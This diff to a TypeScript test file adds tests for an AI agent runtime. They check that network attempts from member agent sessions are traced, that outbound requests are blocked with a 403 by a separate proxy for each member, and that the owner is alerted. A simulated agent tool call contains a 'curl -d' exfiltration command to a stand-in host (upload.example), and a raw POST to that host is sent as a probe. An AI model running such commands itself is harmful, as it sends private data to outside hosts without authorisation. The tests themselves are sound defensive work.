@@ -3,6 +3,7 @@ import { mkdirSync, mkdtempSync, realpathSync, readFileSync, rmSync, writeFileSy
 import { join } from 'node:path';
 import { tmpdir, userInfo } from 'node:os';
 import { createRequire } from 'node:module';
+import { connect } from 'node:net';
 import { createPrincipalRepository } from '@jungjaehoon/mama-core';
 import type { JudgmentAccess } from '@jungjaehoon/mama-core';
 import type { ActionIpcServerOptions } from '@jungjaehoon/mama-core/client/ipc';
@@ -19,6 +20,7 @@ import { openCoreDatabase } from '../../src/runtime/core-db.js';
 import { createTimeZoneSetting } from '../../src/runtime/timezone.js';
 import { memberClaudeTmpDir, memberPaths } from '../../src/runtime/member-paths.js';
 import { credentialReadPaths, physicalReadPath } from '../../src/runtime/backend-security.js';
+import { createOutboundEventRecorder } from '../../src/api/security-events.js';
 
 // Only the unavailable socket transport is replaced. Core intake, credentials, mailbox,
 // native runner, records, model_runs and traces stay real.
@@ -83,6 +85,7 @@ async function fixture(backend: 'codex' | 'claude' = 'codex', withRoot = true) {
   const stopped: string[] = [];
   let failMember = false;
   let ownerGate: Promise<void> | undefined;
+  let networkSentinel: string | undefined;
   const options: OwnerRuntimeOptions = {
     backend,
     model: 'fixture',
@@ -139,6 +142,12 @@ async function fixture(backend: 'codex' | 'claude' = 'codex', withRoot = true) {
             context: opts?.toolExecutionContext,
           });
           if (principal === 'owner' && ownerGate) await ownerGate;
+          if (networkSentinel) {
+            callbacks?.onToolUse?.('Bash', {
+              command: `curl -d ${networkSentinel} https://upload.example/private?q=${networkSentinel}`,
+              nativeToolUseId: `network:${turns.length}`,
+            });
+          }
           if (backend === 'codex') {
             await opts?.hostToolBridge?.execute({
               callId: `fixture-call:${turns.length}`,
@@ -200,6 +209,9 @@ async function fixture(backend: 'codex' | 'claude' = 'codex', withRoot = true) {
     natives,
     pool,
     stopped,
+    emitNetwork: (sentinel = 'MEMBER_NETWORK_SENTINEL') => {
+      networkSentinel = sentinel;
+    },
     blockOwner: (gate: Promise<void>) => {
       ownerGate = gate;
     },
@@ -208,6 +220,153 @@ async function fixture(backend: 'codex' | 'claude' = 'codex', withRoot = true) {
     },
   };
 }
+
+it.each(['codex', 'claude'] as const)(
+  'keeps member shell network starts in tool_traces without shared events or alerts (%s)',
+  async (backend) => {
+    const f = await fixture(backend);
+    const sent: string[] = [];
+    const path = join(f.home, 'security-events.jsonl');
+    const recorder = createOutboundEventRecorder({
+      path,
+      timeZone: f.options.timeZone,
+      sendToOwner: async (text) => {
+        sent.push(text);
+      },
+    });
+    f.options.outboundAttempts = recorder.record;
+    f.emitNetwork();
+    const runtime = await createOwnerRuntime(f.options);
+    try {
+      runtime.intake.acceptOwnerMessage({
+        text: 'owner request',
+        id: 'fixture:owner-network',
+        channelKey: 'fixture',
+        occurredAt: 4,
+      });
+      await vi.waitFor(() => expect(sent).toHaveLength(1));
+      const ownerLog = readFileSync(path, 'utf8');
+      const ownerAlerts = [...sent];
+      const intake = runtime.serveMember(f.member);
+      intake.acceptOwnerMessage({
+        text: 'member request',
+        id: 'fixture:member-network',
+        channelKey: 'fixture',
+        occurredAt: 5,
+      });
+      await vi.waitFor(() => {
+        const traces = runtime.database.adapter
+          .prepare(
+            'SELECT input_summary FROM tool_traces t JOIN model_runs r ON r.model_run_id = t.model_run_id WHERE r.agent_id = ? AND t.tool_name = ?'
+          )
+          .all(`member-agent:${f.member}`, 'Bash') as Array<{ input_summary: string }>;
+        expect(traces).toHaveLength(1);
+        expect(traces[0].input_summary).toContain('MEMBER_NETWORK_SENTINEL');
+      });
+      await vi.waitFor(() => expect(intake.isPending!('fixture:member-network')).toBe(false));
+      expect(readFileSync(path, 'utf8')).toBe(ownerLog);
+      expect(sent).toEqual(ownerAlerts);
+    } finally {
+      await runtime.stop();
+    }
+  }
+);
+
+it('binds a separate proxy at each Claude member session start and closes it on shutdown (TCP binding)', async () => {
+  const f = await fixture('claude');
+  const sent: string[] = [];
+  const path = join(f.home, 'security.jsonl');
+  const recorder = createOutboundEventRecorder({
+    path,
+    timeZone: f.options.timeZone,
+    sendToOwner: async (text) => {
+      sent.push(text);
+    },
+  });
+  const ownerProxy = { httpProxyPort: 41001, socksProxyPort: 41002 };
+  f.options.sandboxNetworkProxy = ownerProxy;
+  f.options.outboundAttempts = recorder.record;
+  f.emitNetwork('MEMBER_PROXY_SENTINEL');
+  let rejectTurn!: (error: Error) => void;
+  const turnFailure = new Promise<never>((_resolve, reject) => {
+    rejectTurn = reject;
+  });
+  f.options.onStimulusFailed = (_row, reason) => {
+    rejectTurn(new Error(reason));
+  };
+  const runtime = await createOwnerRuntime(f.options);
+  const ports: number[] = [];
+  try {
+    const second = createPrincipalRepository(runtime.database.adapter).registerMember({
+      connector: 'telegram',
+      namespace: 'private',
+      externalId: 'fixture-second',
+      now: 4,
+    });
+    for (const principalId of [f.member, second]) {
+      const intake = runtime.serveMember(principalId);
+      const id = `fixture:proxy:${principalId}`;
+      intake.acceptOwnerMessage({
+        id,
+        text: 'member request',
+        channelKey: 'fixture',
+        occurredAt: 5,
+      });
+      await Promise.race([
+        turnFailure,
+        vi.waitFor(() => expect(intake.isPending!(id)).toBe(false), { timeout: 5_000 }),
+      ]);
+      const settings = JSON.parse(
+        readFileSync(
+          join(memberPaths(f.root, principalId).workspaceDir, '.claude', 'settings.json'),
+          'utf8'
+        )
+      );
+      expect(settings.sandbox.network).not.toEqual(ownerProxy);
+      ports.push(settings.sandbox.network.httpProxyPort, settings.sandbox.network.socksProxyPort);
+      const reply = await new Promise<string>((resolve, reject) => {
+        const socket = connect(settings.sandbox.network.httpProxyPort, '127.0.0.1');
+        let body = '';
+        socket.on('connect', () =>
+          socket.write(
+            'POST http://upload.example/MEMBER_PROXY_SENTINEL?q=MEMBER_PROXY_SENTINEL HTTP/1.1\r\nHost: upload.example\r\nContent-Length: 21\r\n\r\nMEMBER_PROXY_SENTINEL'
+          )
+        );
+        socket.on('data', (data) => {
+          body += data.toString();
+        });
+        socket.on('close', () => resolve(body));
+        socket.on('error', reject);
+      });
+      expect(reply).toMatch(/^HTTP\/1.1 403/);
+      await vi.waitFor(() =>
+        expect(sent.at(-1)).toContain(`Member: ${principalId}\nHost: upload.example:80`)
+      );
+      expect(sent.at(-1)).not.toContain('MEMBER_PROXY_SENTINEL');
+    }
+    expect(new Set(ports).size).toBe(4);
+    const ownerSettings = JSON.parse(
+      readFileSync(join(f.options.workspaceDir, '.claude', 'settings.json'), 'utf8')
+    );
+    expect(ownerSettings.sandbox.network).toEqual(ownerProxy);
+    expect(sent).toHaveLength(2);
+    expect(readFileSync(path, 'utf8')).not.toContain('MEMBER_PROXY_SENTINEL');
+  } finally {
+    await runtime.stop();
+  }
+  for (const port of ports) {
+    await expect(
+      new Promise((resolve, reject) => {
+        const socket = connect(port, '127.0.0.1');
+        socket.on('connect', () => {
+          socket.destroy();
+          resolve('still open');
+        });
+        socket.on('error', reject);
+      })
+    ).rejects.toMatchObject({ code: 'ECONNREFUSED' });
+  }
+});
 
 it.each(['codex', 'claude'] as const)(
   'denies external owner data and all siblings, refreshes a later enrollment before the next turn (%s)',
